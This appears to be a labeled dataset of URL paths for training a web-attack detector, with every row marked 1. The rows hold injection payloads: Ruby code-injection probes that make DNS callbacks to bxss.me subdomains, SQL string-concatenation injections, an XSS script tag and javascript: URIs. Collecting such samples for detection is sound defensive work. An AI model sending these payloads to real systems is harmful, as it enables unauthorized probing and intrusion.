sentences	labels
/******/system/2017/03/05/javascript:void(); 	 1
socket.gethostbyname(""hitle"" ""kcqepxlh7dfb3.bxss.me."")[3].to_s) ""/****/7/12/art_35_234319.html 	 1
socket.gethostbyname('hitev' 'ybtblhdkd8b81.bxss.me.')[3].to_s) '/**/widgets/scrollup/js/jquery.scrollup.min.js 	 1
/******/system/2017/10/27/javascript:window.close(); 	 1
/******/system/2019/08/22/javascript:window.close(); 	 1
/******/n239751'||'/index.html 	 1
socket.gethostbyname('hitkd' 'xctfnpesd64db.bxss.me.')[3].to_s) '/****/110105008056111/16/images/result.css 	 1
socket.gethostbyname(""hitoz"" ""opfdmtji04ff5.bxss.me."")[3].to_s) ""/**/11/art_34_242320.html 	 1
socket.gethostbyname(""hitia"" ""oticbxee5fa44.bxss.me."")[3].to_s) ""/*****/sz/202108/t20210806_185416.html 	 1
socket.gethostbyname(""hitgx"" ""edjswaxy7c0fe.bxss.me."")[3].to_s) ""/*******/jquery.panel.js 	 1
socket.gethostbyname(""hitex"" ""ubrrtffof52e8.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/catesearchbtn.js 	 1
socket.gethostbyname('hityf' 'nnjcfbmaac3d3.bxss.me.')[3].to_s) '/****/list.html 	 1
/******/system/2016/11/07/javascript:void(); 	 1
socket.gethostbyname(""hitzp"" ""psnxbltt2ffa1.bxss.me."")[3].to_s) ""/*****/grouppic/jquery.ad-gallery.js 	 1
socket.gethostbyname(""hitin"" ""apibpijvd2664.bxss.me."")[3].to_s) ""/**/art_32_237912.html 	 1
/******/system/2017/11/28/javascript:void(0); 	 1
/******/system/2016/04/11/javascript:window.close(); 	 1
socket.gethostbyname(""hittm"" ""roznikxp89cf8.bxss.me."")[3].to_s) ""/*****/201610/t20161016_531.html 	 1
/******/n42748'||'/c1719357/content.html 	 1
/******/n236753/n236776'||'/c1649498/content.html 	 1
/******/system/2017/12/21/javascript:window.print() 	 1
/¡®¡å'()&%<acx><script >ikcd(9168)</script>/****/sgaj/ 	 1
/******/system/2021/03/13/javascript:void(); 	 1
